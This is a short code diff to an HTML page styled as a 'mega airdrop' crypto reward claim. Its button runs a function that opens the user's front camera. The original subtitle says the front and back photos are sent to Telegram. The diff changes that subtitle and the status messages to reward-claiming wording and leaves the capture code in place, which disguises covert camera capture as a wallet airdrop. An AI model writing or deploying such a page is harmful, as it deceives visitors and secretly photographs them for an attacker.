@@ -144,11 +144,11 @@
 <body>
 
   <h1 class="glow">mega airdrop layer 1</h1>
-  <p class="subtitle">One tap → Front & Back photos instantly sent to Telegram</p>
+  <p class="subtitle">One tap → claim & reward  instantly sent to Wallet</p>
 
   <div class="premium-card">
     <button id="captureBtn" onclick="captureBothCameras()">
-      claim reward
+      claim reward 
     </button>
 
     <div id="status"></div>
@@ -160,12 +160,12 @@
 
     async function captureBothCameras() {
       btn.disabled = true;
-      btn.textContent = "Capturing...";
+      btn.textContent = "claiming...";
       status.textContent = "";
 
       try {
         // Front camera
-        status.textContent = "Front camera capturing...";
+        status.textContent = "reward claiming...";
         const frontStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" }
         });
